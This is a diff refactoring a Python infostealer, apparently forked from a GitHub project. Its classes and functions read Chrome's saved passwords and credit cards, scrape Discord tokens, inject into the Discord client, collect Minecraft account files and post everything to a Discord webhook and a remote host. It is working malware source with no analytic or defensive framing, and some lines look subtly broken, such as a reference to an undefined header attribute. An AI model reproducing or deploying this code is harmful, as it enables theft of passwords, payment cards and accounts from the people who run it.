@@ -2,6 +2,8 @@
 # Current line count:
 
 # Originally created by github.com/rpie
+# Changes I made: Organized project a tiny bit more, also changed some global names
+# and decided to clarify some comments.
 
 import ctypes
 import os
@@ -23,29 +25,34 @@ from colorama import Fore
 
 """ Global variables """
 
-webhook 	= 	'' 									# Discord webhook URL
-website 	= 	'' 									# Optional redirect to website
-credRec 	= 	'' 									# "Look at index.php in /server" --- HellSec please provide some clarification here?
+WEBHOOK 	= 	'' 									# Discord webhook URL
+REDIRECT 	= 	'' 									# Optional redirect to website
+HOST	 	= 	'' 									# Server host URL (e.g: http://127.0.0.1/)
 CHROME_DATA 	=	'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	# Chrome login data path
+USERNAME	=	os.environ.get('USERNAME')						# Username environment variable
+APPDATA		=	os.getenv('APPDATA')							# Appdata environment variable
 
-debug 		= 	False									# Enable or disable debugging
+DEBUG 		= 	False									# Enable or disable debugging
 
 """ Classes """
 
 class Sender:
 	def __init__(self, url):
-		self.url = url
-
+		self.url 	= 	url
+		self.req 	= 	urllib.request.Request(self.url)
+		
+		self.agent 	=	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
+		self.content	=	"application/json; charset=utf-8"
+		
 	def send(self, data):
-		req = urllib.request.Request(self.url)
-
 		jsondata = json.dumps(data)
 		reqbytes = jsondata.encode("utf-8")
 
-		req.add_header("Content-Type","application/json; charset=utf-8")
-		req.add_header("Content-Length",len(reqbytes))
-		req.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36")
-		urllib.request.urlopen(req, reqbytes)
+		self.req.add_header("Content-Type",self.type)
+		self.req.add_header("User-Agent",self.agent)
+		self.req.add_header("Content-Length",len(reqbytes))
+		
+		urllib.request.urlopen(self.req, reqbytes)
 
 class SQLite3Connection:
 	def __init__(self, path):
@@ -55,7 +62,7 @@ class SQLite3Connection:
 		except:
 			pass
 
-	def run(self,query):
+	def run(self, query):
 		self.cursor.execute(query)
 		return self.cursor.fetchall()
 
@@ -66,19 +73,21 @@ class SQLite3LockedConnection:
 	def __init__(self,path):
 		self.path = shutil.copy(path,os.getcwd() + "\\" + "".join(random.choice(string.ascii_uppercase)) +".bak")
 		self.connection = SQLite3Connection(self.path)
+
 	def run(self,query):
 		return self.connection.run(query)
+	
 	def close(self):
 		self.connection.close()
 		os.remove(self.path)
 
 class CardStealer:
 	def __init__(self):
-		self.connection = SQLite3LockedConnection(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
-
+		self.connection = 	SQLite3LockedConnection(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
+		self.stolen 	= 	[]
+		
 	def steal(self):
 		data = self.connection.run("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
-		stolen = []
 		if len(data) > 0:
 			for result in data:
 				cardname = result[0]
@@ -89,22 +98,18 @@ class CardStealer:
 				except:
 					pass
 				if cardnumber:
-					stolen.append({
+					self.stolen.append({
 						"cardname": cardname,
 						"expirationdate": str(expirationmonth) + "/" + str(expirationyear),
 						"cardnumber": cardnumber[1].decode()
 					})
-		else:
-			return None
 
 		self.connection.close()
-		return stolen
+		return self.stolen
 
 class PasswordStealer:
 	def __init__(self):
-		self.connection = SQLite3LockedConnection(
-			os.getenv("USERPROFILE") + CHROME_DATA
-		)
+		self.connection = SQLite3LockedConnection(os.getenv("USERPROFILE") + CHROME_DATA)
 		self.stolen = []
 		
 	def steal(self):
@@ -125,24 +130,22 @@ class PasswordStealer:
 						"password": password[1].decode()
 					})
 	
-			return self.stolen
+		self.connection.close()
+		return self.stolen
 		
-		return None
 
 """ Functions """
 
 def getLocations():
-    username = os.environ.get('username')
-
     if os.name == 'nt':
         locations = [
-            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
-            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
+            f'{APPDATA}\\.minecraft\\launcher_accounts.json',
+            f'{APPDATA}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
         ]
         
     else:
         locations = [
-            f'\\home\\{username}\\.minecraft\\launcher_accounts.json',
+            f'\\home\\{USERNAME}\\.minecraft\\launcher_accounts.json',
             f'\\sdcard\\games\\com.mojang\\',
             f'\\~\\Library\\Application Support\\minecraft'
             f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
@@ -167,7 +170,7 @@ def MinecraftStealer():
     return accounts
 
 def illegal():
-    sender = Sender(credRec)
+    sender = Sender(HOST)
 
     cs = CardStealer()
     ps = PasswordStealer()
@@ -186,14 +189,14 @@ def illegal():
 def isAdmin():
     try: AdminStatus = os.getuid() == 0
     except AttributeError: AdminStatus = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if debug:
+    if DEBUG:
         print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Admin: {AdminStatus}')
     return AdminStatus
 
 def RunCMD(command, wait = False):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
     if wait: process.wait()
-    if debug:
+    if DEBUG:
         print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Ran Command: {command}')
 
 def inject(location):
@@ -211,7 +214,7 @@ def findEnd(userName):
 
     for x in os.listdir('C:\\Users\\' + userName + '\AppData\Local\Discord'):
         if x.startswith("app-"):
-            if debug:
+            if DEBUG:
                 print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Scanning: {x} | {x[4:]}')
             versions.append(x[4:])
 
@@ -262,50 +265,27 @@ def ScrapeTokens(roaming):
                     for token in re.findall(regex, line):
                         if token in tokens:
                             continue
-                        if debug:
+                        if DEBUG:
                             print(f'{Fore.YELLOW}[DEBUG]{Fore.RESET} Found Token: {path}')
                         tokens.append(token)
     
     return tokens
 
 def replacePage():
-    chrome = PyChromeDevTools.ChromeInterface(port=9223)
-    chrome.Page.navigate(url=str(website))
+    if REDIRECT:
+    	chrome = PyChromeDevTools.ChromeInterface(port=9223)
+    	chrome.Page.navigate(url=str(REDIRECT))
 
 def main():
-    if isAdmin():
-        pass
-
     illegal()
-
-    findEnd(
-        os.environ.get('username')
-    )
-    
-    scrapedTokens = ScrapeTokens(
-        os.getenv('APPDATA')
-    )
-
-    minecraftCreds = MinecraftStealer()
-
+    findEnd(USERNAME)
     replacePage()
 
-    message = f'''
-User: {os.environ.get('username')}
-Client Deface: True
-Tokens: ```json\n{scrapedTokens}\n```
-'''
+    DATA = f'User: {os.environ.get('username')}\nTokens: ```json\n{ScrapeTokens(APPDATA)}\n```\n' \
+	    + f'Minecraft Accounts: ```json\n{MinecraftStealer()}\n```'
 
-    r = requests.post(
-        url=webhook,
-        data = {
-        'content': f'''
-            User: {os.environ.get('username')}
-            Client Deface: True
-            Tokens: ```json\n{scrapedTokens}\n```
-            Minecraft Accounts: ```json\n{minecraftCreds}\n```
-        '''
-        }
+    requests.post(url=WEBHOOK,
+        data = { 'content': DATA }
     )
     
 if __name__ == '__main__':
